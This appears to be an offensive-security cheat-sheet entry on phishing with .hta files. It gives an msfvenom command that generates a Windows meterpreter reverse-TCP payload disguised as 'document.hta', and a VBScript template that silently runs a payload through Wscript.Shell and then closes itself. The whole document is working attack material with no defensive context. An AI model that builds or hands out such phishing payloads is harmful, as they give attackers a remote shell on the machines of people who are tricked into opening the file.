# Phishing

## .hta phishing

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=LHOST LPORT=LPORT -f hta-psh -o document.hta
```

```vbscript
<script language="VBScript">
  Function Update()
    Dim yz
    Set yz = CreateObject("Wscript.Shell")
    yz.run "PAYLOAD"
    Set yz = Nothing
  End Function
  
  Update
  self.close
</script>
```
